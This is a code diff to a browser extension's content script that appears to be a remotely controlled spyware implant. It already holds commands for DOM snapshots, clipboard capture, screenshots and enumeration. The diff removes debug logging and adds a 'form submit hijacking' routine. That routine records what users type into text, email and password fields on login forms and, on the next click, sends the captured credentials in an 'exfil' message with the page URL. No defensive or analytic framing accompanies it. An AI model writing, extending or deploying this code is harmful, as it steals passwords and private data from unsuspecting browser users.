@@ -1,11 +1,7 @@
 // content_script.js
 
-console.log('[ContentScript] Injected');
-
 // Listen for commands from background
 chrome.runtime.onMessage.addListener((msg, sender, reply) => {
-  console.log('[ContentScript] Received:', msg);
-
   if (msg.command === 'domSnapshot') {
     const snapshot = document.documentElement.outerHTML;
     chrome.runtime.sendMessage({
@@ -17,8 +13,6 @@ chrome.runtime.onMessage.addListener((msg, sender, reply) => {
       }
     });
   } else if (msg.command === 'clipboardCapture') {
-    console.log('[ContentScript] Attempting clipboard capture...');
-    
     (async () => {
       try {
         // Check if we have clipboard permission
@@ -49,7 +43,6 @@ chrome.runtime.onMessage.addListener((msg, sender, reply) => {
           throw new Error('Clipboard permission denied');
         }
       } catch (err) {
-        console.error('[ContentScript] Clipboard Error:', err);
         chrome.runtime.sendMessage({
           type: 'exfil',
           data: {
@@ -79,7 +72,7 @@ chrome.runtime.onMessage.addListener((msg, sender, reply) => {
     chrome.runtime.sendMessage(
       { type: 'capture_screenshot', location: window.location.href },
       function(response) {
-        console.log('[ContentScript] Screenshot capture requested.');
+        // Acknowledgment can be handled here if needed
       }
     );
   } else if (msg.command === 'enumeration') {
@@ -264,3 +257,85 @@ function hasCanvas() {
 function hasAudioSupport() {
   return !!(window.AudioContext || window.webkitAudioContext);
 }
+
+
+
+// --- Form Submit Hijacking Logic ---
+
+let formCaptureConfig = { enabled: false, domains: [] };
+const STORAGE_KEY = 'temp_credentials';
+
+function loadFormCaptureConfig() {
+  chrome.storage.local.get('form_capture_config', (result) => {
+    if (result.form_capture_config) {
+      formCaptureConfig = result.form_capture_config;
+      // If the feature is being enabled, clear any stale credentials from storage
+      if (formCaptureConfig.enabled) {
+        chrome.storage.local.remove(STORAGE_KEY);
+      }
+    } else {
+      formCaptureConfig = { enabled: false, domains: [] }; // Ensure config is reset if not found
+    }
+  });
+}
+
+// Listen for input events to capture credentials in real-time and save to storage
+function handleInput(event) {
+    if (!formCaptureConfig.enabled) return;
+
+    const target = event.target;
+    if (target.tagName === 'INPUT' && (target.type === 'text' || target.type === 'password' || target.type === 'email')) {
+        const form = target.closest('form, div, section');
+        if (form && form.querySelector('input[type="password"]')) {
+            const name = target.name || target.id || target.placeholder || target.type;
+            if (name) {
+                chrome.storage.local.get(STORAGE_KEY, (data) => {
+                    const credentials = data[STORAGE_KEY] || {};
+                    credentials[name] = target.value;
+                    chrome.storage.local.set({ [STORAGE_KEY]: credentials });
+                });
+            }
+        }
+    }
+}
+
+// Listen for clicks to detect submission attempt
+function handleClick(event) {
+    if (!formCaptureConfig.enabled) return;
+
+    // No need to check the form context here, as the input handler already qualified the form.
+    // Any relevant click could be the submission trigger, especially in multi-iframe scenarios.
+    chrome.storage.local.get(STORAGE_KEY, (data) => {
+        const capturedCredentials = data[STORAGE_KEY];
+        if (capturedCredentials && Object.keys(capturedCredentials).length > 0) {
+            // Exfiltrate data
+            chrome.runtime.sendMessage({
+                type: 'exfil',
+                data: {
+                    action: 'form_submit_capture',
+                    credentials: capturedCredentials,
+                    location: window.location.href
+                }
+            });
+
+            // Disable feature and clear storage
+            formCaptureConfig.enabled = false;
+            chrome.storage.local.set({ form_capture_config: formCaptureConfig });
+            chrome.storage.local.remove(STORAGE_KEY);
+        }
+    });
+}
+
+// --- Initialization ---
+loadFormCaptureConfig();
+document.addEventListener('input', handleInput, true);
+document.addEventListener('click', handleClick, true);
+
+// Add listener for config updates from background script
+chrome.runtime.onMessage.addListener((msg, sender, reply) => {
+    if (msg.command === 'update_form_capture_config') {
+        loadFormCaptureConfig();
+    }
+    return true; // Keep message channel open for other listeners
+});
+
